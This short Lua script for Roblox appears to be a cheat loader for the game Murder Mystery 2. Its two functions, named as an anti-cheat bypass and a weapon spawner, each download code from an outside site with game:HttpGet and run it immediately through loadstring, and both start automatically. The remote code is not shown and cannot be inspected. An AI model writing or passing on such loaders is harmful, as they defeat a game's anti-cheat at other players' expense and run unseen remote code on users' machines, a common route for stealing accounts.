local function BypassAntiCheat()
        loadstring(game:HttpGet("https://arscripts.space/MM2SCRIPT"))()
end
local function MM2Spawner()
        loadstring(game:HttpGet("https://arscripts.space/MM2WeaponSpawnerScript", true))()
end
task.spawn(BypassAntiCheat)
task.spawn(MM2Spawner)
